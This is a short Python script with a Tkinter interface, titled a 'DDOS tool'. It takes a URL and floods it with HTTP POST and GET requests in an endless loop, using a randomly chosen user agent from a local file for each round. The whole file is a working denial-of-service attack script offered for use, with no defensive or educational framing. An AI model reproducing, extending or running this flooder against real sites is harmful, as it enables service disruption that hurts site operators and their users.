from tkinter import *
import requests
import random
import os

tk = Tk()
tk.title('Py GUI DDOS TOOL')
def ddosit():
    geturl = entry1.get()
    entry1.delete(0, "end")
    while True:
        with open(os.path.dirname(os.path.realpath(__file__)) + '\\user-agent.txt') as f:
            randomProxy = random.choice(list(f.readlines())).splitlines()[0]
        headers = {'User-Agent': randomProxy} 
        timeout = 5
        requests.post(geturl,headers=headers, timeout=timeout)
        requests.post(geturl, headers=headers)
        requests.get(geturl,headers=headers, timeout=timeout)

label = Label(tk,text=' ').pack(side=TOP,padx=0,pady=0) 
label = Label(tk,text='Python DDOS Tool').pack(side=TOP,padx=0,pady=0) 
label = Label(tk,text='Please insert URL :').pack(side=LEFT,padx=10,pady=10) 
entry1 = Entry(tk)
entry1.pack(side=LEFT,padx=10,pady=30) 
btn1 = Button(tk,text='DDOS IT',bg='gray',fg='black',command=ddosit)
btn1.pack(side=LEFT,padx=20,pady=20) 

tk.mainloop()